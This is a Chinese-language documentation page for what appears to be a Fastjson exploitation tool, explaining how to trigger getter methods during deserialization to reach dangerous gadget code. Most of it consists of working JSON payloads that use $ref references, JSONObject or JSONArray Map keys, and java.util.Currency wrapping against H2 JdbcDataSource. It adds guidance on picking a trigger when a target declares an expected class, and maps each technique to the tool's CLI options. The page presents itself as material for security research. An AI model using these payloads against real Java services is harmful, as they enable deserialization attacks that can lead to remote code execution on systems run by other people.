---
title: Getter 触发技巧
description: Fastjson 中通过 $ref、JSONObject 作 Map key、java.util.Currency 触发 getter 的常用手法
order: 6
---

# Getter 触发技巧

Fastjson 反序列化里，不少 Gadget 依赖 **getter**（如 `getConnection()`）才会真正走到危险逻辑。本文汇总与版本无关的几类触发手法，供安全研究与本地复现参考。

相关阅读：

- [$ref 触发 getter](https://xz.aliyun.com/news/16117)
- [java.util.Currency 触发所有 getter](https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww)
- [期望类判断](/docs/fastjson-detect#4-期望类判断)
- [≤1.2.68 利用技巧](/docs/fastjson-1.2.68)
- [≤1.2.80 利用技巧](/docs/fastjson-1.2.80)
- [≤1.2.47 利用技巧](/docs/fastjson-1.2.47)

本工具 PoC 页 / CLI 已统一暴露 `getter_trigger`：`ref` / `json_key` / `currency` / `currency_json_key`。

---

## 1. `$ref` 触发 getter

当 `JSON.parse` / `JSON.parseObject` **不指定期望类型**时，可通过 `$ref` 引用任意字段路径，从而调用对应属性的 getter。

典型形态（以 H2 `JdbcDataSource` 为例）：

```json
{
  "x1": {
    "@type": "java.lang.Class",
    "val": "org.h2.jdbcx.JdbcDataSource"
  },
  "x2": {
    "@type": "com.alibaba.fastjson.JSONObject",
    "c": {
      "@type": "org.h2.jdbcx.JdbcDataSource",
      "url": "jdbc:h2:mem:test;..."
    }
  },
  "x3": {
    "$ref": "$.x2.c.connection"
  }
}
```

说明：

- `$ref` 指向 `$.x2.c.connection` 时，会走到 `JdbcDataSource.getConnection()`。
- 适合无期望类的裸 `parse` / `parseObject`。
- 本仓库多数基于 `JSON.parse()` 的 payload **默认已内嵌 `$ref`**。

---

## 2. JSONObject / JSONArray 作 Map key

把 **对象当作 Map 的 key**。Map 需要把 key 转成字符串时，会调用该对象的 `toString()`；对 `JSONObject` 而言，`toString()` 会遍历字段并触发 getter。这与原生反序列化里「非 String key → toString」的路径一致。

可带 `@type`：

```json
{
  "x1": {
    "@type": "java.lang.Class",
    "val": "org.h2.jdbcx.JdbcDataSource"
  },
  {
    "@type": "com.alibaba.fastjson.JSONObject",
    "c": {
      "@type": "org.h2.jdbcx.JdbcDataSource",
      "url": ""
    }
  }: {}
}
```

可省略 `@type`（`{}` 默认也会解析为 `JSONObject`）：

```json
{
  {
    "c": {
      "@type": "org.h2.jdbcx.JdbcDataSource",
      "url": ""
    }
  }: {}
}
```

最外层也可改成 `JSONArray`：

```json
{
  [{
    "c": {
      "@type": "org.h2.jdbcx.JdbcDataSource",
      "url": ""
    }
  }]: {}
}
```

注意：上述写法是 Fastjson 可接受的 **非严格 JSON**（对象/数组作 key），标准 JSON 解析器会拒绝。

---

## 3. `java.util.Currency` 触发全部 getter

`java.util.Currency` 由 **MiscCodec** 反序列化。MiscCodec 要求把 `val` 里某个字段（`currency` 或 `currencyCode`）当作 Map 处理；其中 key 若是 `JSONObject`，在转成字符时会走 `JSONObject.toString()`，从而触发 getter。

骨架（可用 [java-chains](https://github.com/vulhub/java-chains) 等工具生成）：

```json
{
  "x": {
    "@type": "java.util.Currency",
    "val": {
      "currency": {
        "xx": {
          【payload】
        }
      }
    }
  }
}
```

`currency` 也可写成 `currencyCode`（MiscCodec 两种字段名均可）。

套层后的完整示例（内层用 JSONObject 作 key）：

```json
{
  "x": {
    "@type": "java.util.Currency",
    "val": {
      "currency": {
        "xx": {
          "x1": {
            "@type": "java.lang.Class",
            "val": "org.h2.jdbcx.JdbcDataSource"
          },
          {
            "@type": "com.alibaba.fastjson.JSONObject",
            "c": {
              "@type": "org.h2.jdbcx.JdbcDataSource",
              "url": "jdbc:h2:mem:test;..."
            }
          }: {}
        }
      }
    }
  }
}
```

也可在 **已有 `$ref` 形态** 外再套一层 Currency（本工具的 `getter_trigger=currency`）。

---

## 4. 有期望类时怎么选

| 场景 | 推荐触发 | 本工具选项 |
|------|----------|------------|
| `parse` / `parseObject` **无**期望类 | `$ref` 或 JSONObject 作 key | `ref` / `json_key` |
| 业务反序列化点 **有**期望类 | 需再套 `java.util.Currency` | `currency` / `currency_json_key` |

要点：

- 下面不少公开 payload 是按 `JSON.parse()` 写的，**没考虑期望类**。
- 若接口是 `parseObject(json, ExpectClass.class)` 一类，仅靠内嵌 `$ref` 往往不够，需要套 Currency，才能在 MiscCodec 路径里触发 getter。
- 1.2.68 / 1.2.80 里常见的 AutoCloseable / Exception 双 `@type` 是 **另一类期望类绕过**；Currency 解决的是「有期望类时如何触发 getter」，二者可叠加。

期望类本身的判断手法见 [Fastjson 探测分析 · 期望类判断](/docs/fastjson-detect#4-期望类判断)。

---

## 5. 与本工具的对应关系

| `getter_trigger` | 含义 |
|------------------|------|
| `ref`（默认） | 内嵌 `$ref`，适合无期望类 |
| `json_key` | JSONObject / JSONArray 作 Map key（可省略 `@type`） |
| `currency` | 在 `$ref` 形态外再套 Currency |
| `currency_json_key` | Currency + JSONObject 作 key（java-chains 常见形态） |

CLI / Web PoC 中，Currency 字段可选 `currency` 或 `currencyCode`；1.2.68 / 1.2.80 亦提供 `--wrap-currency`（对已内嵌 `$ref` 的链逐步套层）。
